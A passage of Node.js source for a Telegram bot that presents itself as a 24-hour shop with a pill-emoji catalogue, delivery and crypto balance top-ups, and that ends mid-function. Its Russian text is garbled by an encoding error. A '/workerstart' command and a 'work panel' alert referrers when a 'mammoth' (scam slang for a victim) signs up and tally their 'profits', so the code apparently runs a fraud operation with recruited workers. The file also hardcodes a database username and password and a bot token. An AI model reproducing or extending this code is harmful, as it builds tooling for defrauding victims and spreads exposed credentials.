const mongo = require("mongoose");
mongo.connect("mongodb+srv://curs:curs@cluster0.utfcxxk.mongodb.net/curs");
const random = require("randomstring");
const qrcode = require("qrcode");
const fs = require("fs");
const axios = require('axios');
const CoinGecko = require('coingecko-api');

const CoinGeckoClient = new CoinGecko();

const admins = [5547452982,5857195314];    

function randomInteger(min, max) {
    let rand = min + Math.random() * (max + 1 - min);
    return Math.floor(rand);
  }

const User			=		mongo.model("CBBeta", new mongo.Schema({
	id: Number,
	balance: Number,
	ref: Number,
	idref: Number,
	epr: Number,
	eps: Number,
	invests: Number,
	lxc: Number,
	epv: Number,
	pay: Number, 
	part: Number, 
	day: Number, 
	spay: Number, 
	menu: String,
	adminmenu: String,
	prfUser: String,
	prp: Object,
	akk: Number,
	pakk: Number,
	inv: Number,
    oq: String,
	pod: Number, 
	ow: String,
	oe: String,
	or: String,
	ot: String,
	send: Number, 
    work: Number,
	refmoney: Number,
	bonusTimer: Number,
	viv: Number,
	regDate: String,
	usdt: Number,
	valute: String,
	ton: Number,
	btc: Number,
	eth: Number,
	doge: Number,
	sol: Number,
	trx: Number,
	bnb: Number,
	busd: Number,
	verify: Boolean
}));

const Payment			=		mongo.model("CBBPayment", new mongo.Schema({
id: {
		type: Number,
		required: true,
	},

	amountrub: Number,
    time: {
    type: Number,
    required: true,
    default: 10,
  },
	amountvkc: Number,
	date: Number,
	name: String,
	committed: Boolean,
	uid: Number
}));

const Gift		=		mongo.model("CBBGift", new mongo.Schema({
	id: String,
	uid: Number, 
	crypto: String,
	amount: Number
}));

const Curse			=		mongo.model("CBBRate", new mongo.Schema({
	uid: String,

	rub: Number,
    eur: Number,
	byn: Number,
	uan: Number,
	gbp: Number,
	cny: Number,
	kzt: Number,
	uzs: Number,
	gel: Number,
	try: Number,
	krw: Number,

	Usdt: Number,
	Ton: Number,
    Bitcoin: Number,
	Ethereum: Number, 
    BinanceCoin: Number,
	Busd: Number
}));

const Invests			=		mongo.model("CBBInvest", new mongo.Schema({
	id: Number,
	balance: Number,
	zarabotok: Number,
}));

const Stats			=		mongo.model("CBBStats", new mongo.Schema({
	id: String,
	inv: Number,
	viv: Number,
	suminv: Number,
	sumviv: Number,
	user: Number
}));

const Ticket		=		mongo.model("CBBTicket", new mongo.Schema({
	owner: Number,
	wallet: String,
	amount: Number
}));

const Ban			=		mongo.model("CBBBan", new mongo.Schema({
	id: Number
}));

const Telegram		=		require("node-telegram-bot-api");
const bot			=		new Telegram(
	"6384661233:AAGPLWhVTkE8G9_bQ76LS0rzh58_7FzNq5w", // –¢–æ–∫–µ–Ω BotFather
	{ polling: true }
);

const keyboards		=		{
	main: [
		["/start"],
	],
	cancel: [
		["‚õîÔ∏è –û—Ç–º–µ–Ω–∞"]
	],
	admin: [
		["üßç –†–∞—Å—Å—ã–ª–∫–∞", "üßæ –°–æ–∑–¥–∞—Ç—å –ø–ª–∞—Ç—ë–∂" ],
		["üí∏ –ë–∞–ª–∞–Ω—Å", "üÜî –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"], 
	]
}

bot.on("message", async (message) => {
    if(message.chat.id == -1001540739663) { return }
	let ban = await Ban.findOne({ id: message.from.id });
	if(ban) return;

	message.send = (text, params) => bot.sendMessage(message.chat.id, text, params);
	User.findOne({ id: message.from.id }).then(async ($user) => {
		
		if($user) return;

		let schema = {
			id: message.from.id,
			balance: 0,
			ref: 0,
			inv: 0,
			viv: 0,
			akk: 0,
			lxc: 0,
			valute: `usd`,
			epr: 0,
			eps: 0,
			epv: 0,
			day: 1,
			pay: 0,
			spay: 0,
			idref: 0,
			usdt: 0,
	        ton: 0,
	        btc: 0,
	        eth: 0,
            doge: 0,
	        sol: 0,
	        trx: 0,
	        bnb: 0,
            work: 0,
			refmoney: 0,
	        busd: 0,
			invests: 0,
			bonusTimer: 0,
			oq: ``,
			ow: ``,
			send: 0,
			oe: ``,
			or: ``,
			ot: ``,
			part: 0, 
			pod: 0, 
			menu: "",
			adminmenu: "",
			prfUser: "",
			prp: {},
			regDate: `${new Date().getDate()}.${new Date().getMonth() + 1}.${new Date().getFullYear()}`,
			verify: false
		}

				if(Number(message.text.split("/start ")[1])) {
			schema.ref		=		Number(message.text.split("/start ")[1]);
			let user = new User(schema);
		await user.save();
		await message.send(`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∞–≥–∞–∑–∏–Ω ‚ö°Ô∏è

        ‚ñ™Ô∏è –í –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ –≤ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å—Ä–æ–∫–∏ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –≤–∞–º —Ç–æ–≤–∞—Ä.
        ‚ñ™Ô∏è –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ.
        ‚ñ™Ô∏è –í—Å–µ–≥–¥–∞ —Å–≤–µ—Ä—è–π—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞. –ú–´ –ù–ò–ö–û–ì–î–ê –ù–ï –ù–ê–ü–ò–®–ï–ú –ü–ï–†–í–´–ï. 
        ‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [				   
							[
       { text: "üîé –ü—Ä–æ–π—Ç–∏ –∫–∞–ø—á—É", callback_data: `pod` },
							],
						],
						
			},
				})
				
let ref = await User.findOne({ id: Number(message.text.split("/start ")[1]) });
		let sr = message.from.id
   if(!ref) return
   if(ref.work == 1) {
    await bot.sendMessage(ref.id, `
‚úÖ –ú–∞–º–æ–Ω—Ç @ <a href="tg://user?id=${sr}">id${sr}</a> –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–ª—Å—è –ø–æ —Ç–≤–æ–µ–π —Å—Å—ã–ª–∫–µ [${sr}]`, {
    parse_mode: "HTML"
   });
   }
   if(ref.work == 0) {
   bot.sendMessage(ref.id, `
üê¨ –ù–æ–≤—ã–π <a href="tg://user?id=${sr}">—Ä–µ—Ñ–µ—Ä–∞–ª</a> <b>1</b> —É—Ä–æ–≤–Ω—è`, {
    parse_mode: "HTML"
   });
await User.findOneAndUpdate({ id: ref.id}, { $inc: { part: 1} })
   }
			}
await message.send(`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∞–≥–∞–∑–∏–Ω ‚ö°Ô∏è

‚ñ™Ô∏è –í –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ –≤ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å—Ä–æ–∫–∏ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –≤–∞–º —Ç–æ–≤–∞—Ä.
‚ñ™Ô∏è –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ.
‚ñ™Ô∏è –í—Å–µ–≥–¥–∞ —Å–≤–µ—Ä—è–π—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞. –ú–´ –ù–ò–ö–û–ì–î–ê –ù–ï –ù–ê–ü–ò–®–ï–ú –ü–ï–†–í–´–ï. 
‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.`, {
parse_mode: "HTML",
            reply_markup: {
       inline_keyboard: [				   
                    [
{ text: "üîé –ü—Ä–æ–π—Ç–∏ –∫–∞–ø—á—É", callback_data: `pod` },
                    ],
                ],
                
    },
        })

		let user = new User(schema);
		await user.save();
	});
	message.user = await User.findOne({ id: message.from.id });

	if(message.text === "‚õîÔ∏è –û—Ç–º–µ–Ω–∞" || message.text === "üîô –ù–∞—á–∞–ª–æ" ||message.text === "‚óÄÔ∏è –ù–∞–∑–∞–¥" ) {
	
		await User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: "" } })
		await User.findOneAndUpdate({ id: message.user.id }, { $set: { adminmenu: "" } })
if(message.user.pod == 0) {
		return message.send(`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∞–≥–∞–∑–∏–Ω ‚ö°Ô∏è

        ‚ñ™Ô∏è –í –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ –≤ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å—Ä–æ–∫–∏ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –≤–∞–º —Ç–æ–≤–∞—Ä.
        ‚ñ™Ô∏è –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ.
        ‚ñ™Ô∏è –í—Å–µ–≥–¥–∞ —Å–≤–µ—Ä—è–π—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞. –ú–´ –ù–ò–ö–û–ì–î–ê –ù–ï –ù–ê–ü–ò–®–ï–ú –ü–ï–†–í–´–ï. 
        ‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [				   
							[
       { text: "üîé –ü—Ä–æ–π—Ç–∏ –∫–∞–ø—á—É", callback_data: `pod` },
							],
						],
						
			},
				})
	}
		return message.send(`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∞–≥–∞–∑–∏–Ω ‚ö°Ô∏è

        ‚ñ™Ô∏è –í –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ –≤ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å—Ä–æ–∫–∏ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –≤–∞–º —Ç–æ–≤–∞—Ä.
        ‚ñ™Ô∏è –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ.
        ‚ñ™Ô∏è –í—Å–µ–≥–¥–∞ —Å–≤–µ—Ä—è–π—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞. –ú–´ –ù–ò–ö–û–ì–î–ê –ù–ï –ù–ê–ü–ò–®–ï–ú –ü–ï–†–í–´–ï. 
        ‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.
        `, {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [				   
						[
							{ text: "üíä –ö–∞—Ç–∞–ª–æ–≥", callback_data: `kat` },
                            { text: "üë• –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞", callback_data: `referal` },
							{ text: "‚ÑπÔ∏è –û—Ç–∑—ã–≤—ã", callback_data: `otz` },
							 ],
							 [
								{ text: "üöï –î–æ—Å—Ç–∞–≤–∫–∞", callback_data: `kur` },
                                { text: "‚ö° –ü—Ä–æ—Ñ–∏–ª—å", callback_data: `prof` },
                                { text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", url: `t.me/` },
							 ],
							 [
		{ text: "üî• –†–∞–±–æ—Ç–∞", callback_data: `work` },
        { text: "üõí –ú–æ–∏ –ø–æ–∫—É–ø–∫–∏", callback_data: `pok` },
							 ],
                             [
                                { text: "üí≤ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: `deposit` },
                                                     ],
						 ],
						 
			 }, 
		});
	}

    if(message.text === "/workerstart") {
        await message.user.set("menu", "post");
        await User.findOneAndUpdate({ id: message.user.id }, { $set: { work: 1 } })
        return message.send(`Work –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–∫–ª—é—á–µ–Ω–æ`);
    } 

if(message.text === "/start") {
	if (message.chat.id < 0) { return } 
	if(!message.user) return
	if(message.user.pod == 0) {
		return  message.send(`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∞–≥–∞–∑–∏–Ω ‚ö°Ô∏è

        ‚ñ™Ô∏è –í –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ –≤ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å—Ä–æ–∫–∏ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –≤–∞–º —Ç–æ–≤–∞—Ä.
        ‚ñ™Ô∏è –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ.
        ‚ñ™Ô∏è –í—Å–µ–≥–¥–∞ —Å–≤–µ—Ä—è–π—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞. –ú–´ –ù–ò–ö–û–ì–î–ê –ù–ï –ù–ê–ü–ò–®–ï–ú –ü–ï–†–í–´–ï. 
        ‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [				   
							[
       { text: "üîé –ü—Ä–æ–π—Ç–∏ –∫–∞–ø—á—É", callback_data: `pod` },
							],
						],
						
			},
				})
	}
		await message.send(`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∞–≥–∞–∑–∏–Ω ‚ö°Ô∏è

        ‚ñ™Ô∏è –í –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ –≤ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å—Ä–æ–∫–∏ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –≤–∞–º —Ç–æ–≤–∞—Ä.
        ‚ñ™Ô∏è –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ.
        ‚ñ™Ô∏è –í—Å–µ–≥–¥–∞ —Å–≤–µ—Ä—è–π—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞. –ú–´ –ù–ò–ö–û–ì–î–ê –ù–ï –ù–ê–ü–ò–®–ï–ú –ü–ï–†–í–´–ï. 
        ‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.
        `, {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [				   
                    [
                        { text: "üíä –ö–∞—Ç–∞–ª–æ–≥", callback_data: `kat` },
                        { text: "üë• –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞", callback_data: `referal` },
                        { text: "‚ÑπÔ∏è –û—Ç–∑—ã–≤—ã", callback_data: `otz` },
                         ],
                         [
                            { text: "üöï –î–æ—Å—Ç–∞–≤–∫–∞", callback_data: `kur` },
                            { text: "‚ö° –ü—Ä–æ—Ñ–∏–ª—å", callback_data: `prof` },
                            { text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", url: `t.me/` },
                         ],
                         [
    { text: "üî• –†–∞–±–æ—Ç–∞", callback_data: `work` },
    { text: "üõí –ú–æ–∏ –ø–æ–∫—É–ø–∫–∏", callback_data: `pok` },
                         ],
                         [
                            { text: "üí≤ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: `deposit` },
                                                 ],
						 ],
						 
			 }, 
		});
	}

    if(message.text === "/working") {
        if (message.chat.id < 0) { return } 
        if(!message.user) return
        if(message.user.pod == 0) {
            return  message.send(`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∞–≥–∞–∑–∏–Ω ‚ö°Ô∏è
    
            ‚ñ™Ô∏è –í –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ –≤ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å—Ä–æ–∫–∏ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –≤–∞–º —Ç–æ–≤–∞—Ä.
            ‚ñ™Ô∏è –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ.
            ‚ñ™Ô∏è –í—Å–µ–≥–¥–∞ —Å–≤–µ—Ä—è–π—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞. –ú–´ –ù–ò–ö–û–ì–î–ê –ù–ï –ù–ê–ü–ò–®–ï–ú –ü–ï–†–í–´–ï. 
            ‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.`, {
        parse_mode: "HTML",
                        reply_markup: {
                   inline_keyboard: [				   
                                [
           { text: "üîé –ü—Ä–æ–π—Ç–∏ –∫–∞–ø—á—É", callback_data: `pod` },
                                ],
                            ],
                            
                },
                    })
        }
        let fff = ``
        let ggg = ``
        if(message.user.work == 0) {
            fff += `‚ùå`
            ggg += `<b>‚ùå –í–∫–ª—é—á–∏—Ç–µ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –≤–æ—Ä–∫–µ—Ä–æ–≤</b>`
        }
        if(message.user.work == 1) {
            fff += `‚úÖ`
            ggg += `<b>‚úÖ –†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–µ –ª–æ–≥–∏ –¥–ª—è –≤–æ—Ä–∫–µ—Ä–æ–≤ –≤–∫–ª—é—á–µ–Ω—ã</b>`
        }
            await message.send(`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ work panel ‚ö°Ô∏è
    
ID: ${message.user.id}
–í—ã —Å–¥–µ–ª–∞–ª–∏ <b>${message.user.spay}</b> –ø—Ä–æ—Ñ–∏—Ç–æ–≤ –Ω–∞ —Å—É–º–º—É <b>${message.user.pay}</b> RUB –∑–∞ –≤—Å–µ –≤—Ä–µ–º—è

–í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞: http://t.me/Fjdjfkfjckdibot?start=${message.user.id}

${ggg}
            `, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [				   
                        [
                            { text: `‚Ñπ –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ  (${fff})`, callback_data: `logref` },
                             ],
                    ]      
                 }, 
            });
        }

    if(message.user.menu.startsWith("verif")) {
        let result = (message.user.menu.split("_")[1]);
        if(message.text != result) {
            await  message.send(`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∞–≥–∞–∑–∏–Ω ‚ö°Ô∏è

        ‚ñ™Ô∏è –í –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ –≤ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å—Ä–æ–∫–∏ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –≤–∞–º —Ç–æ–≤–∞—Ä.
        ‚ñ™Ô∏è –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ.
        ‚ñ™Ô∏è –í—Å–µ–≥–¥–∞ —Å–≤–µ—Ä—è–π—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞. –ú–´ –ù–ò–ö–û–ì–î–ê –ù–ï –ù–ê–ü–ò–®–ï–ú –ü–ï–†–í–´–ï. 
        ‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.`, {
	parse_mode: "HTML",
					reply_markup: {
               inline_keyboard: [				   
							[
       { text: "üîé –ü—Ä–æ–π—Ç–∏ –∫–∞–ø—á—É", callback_data: `pod` },
							],
						],
						
			},
				})
                return User.findOneAndUpdate({ id: message.user.id }, { $set: { menu: `` } })
        }
        if(message.text == result) {
            await User.findOneAndUpdate({ id: message.user.id }, { $set: { pod: 1 } })
    await message.send(`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∞–≥–∞–∑–∏–Ω ‚ö°Ô∏è

    ‚ñ™Ô∏è –í –Ω–∞—à–µ–º –º–∞–≥–∞–∑–∏–Ω–µ –≤ –∫–æ—Ä–æ—Ç–∫–∏–µ —Å—Ä–æ–∫–∏ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –≤–∞–º —Ç–æ–≤–∞—Ä.
    ‚ñ™Ô∏è –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –∫—Ä—É–≥–ª–æ—Å—É—Ç–æ—á–Ω–æ.
    ‚ñ™Ô∏è –í—Å–µ–≥–¥–∞ —Å–≤–µ—Ä—è–π—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞. –ú–´ –ù–ò–ö–û–ì–î–ê –ù–ï –ù–ê–ü–ò–®–ï–ú –ü–ï–†–í–´–ï. 
    ‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.
    `, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [				   
                [
                    { text: "üíä –ö–∞—Ç–∞–ª–æ–≥", callback_data: `kat` },
                    { text: "üë• –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞", callback_data: `referal` },
                    { text: "‚ÑπÔ∏è –û—Ç–∑—ã–≤—ã", callback_data: `otz` },
                     ],
                     [
                        { text: "üöï –î–æ—Å—Ç–∞–≤–∫–∞", callback_data: `kur` },
                        { text: "‚ö° –ü—Ä–æ—Ñ–∏–ª—å", callback_data: `prof` },
                        { text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", url: `t.me/` },
                     ],
                     [
{ text: "üî• –†–∞–±–æ—Ç–∞", callback_data: `work` },
{ text: "üõí –ú–æ–∏ –ø–æ–∫—É–ø–∫–∏", callback_data: `pok` },
                     ],
                     [
                        { text: "üí≤ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: `deposit` },
                                             ],
                     ],
                     
         }, 
    });
}
}
		if(message.user.menu.startsWith("gift")) {
			message.text = Number(message.text);
			let crypto = (message.user.menu.split("_")[1]);
            if(crypto == `usdt`) {
            if(message.text < 0.1) {
				return message.send(`–ù–∞ –∫–∞–∫—É—é —Å—É–º–º—É USDT –≤—ã–ø–∏—Å–∞—Ç—å —á–µ–∫? (–ï–≥–æ —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞–ª–∏—á–∏—Ç—å –ª—é–±–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å, –∑–Ω–∞—é—â–∏–π –∫–æ–¥).

–î–æ—Å—Ç—É–ø–Ω–æ: ${message.user.usdt} USDT
–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–µ –º–µ–Ω–µ–µ 0.1 USDT`) 
			}
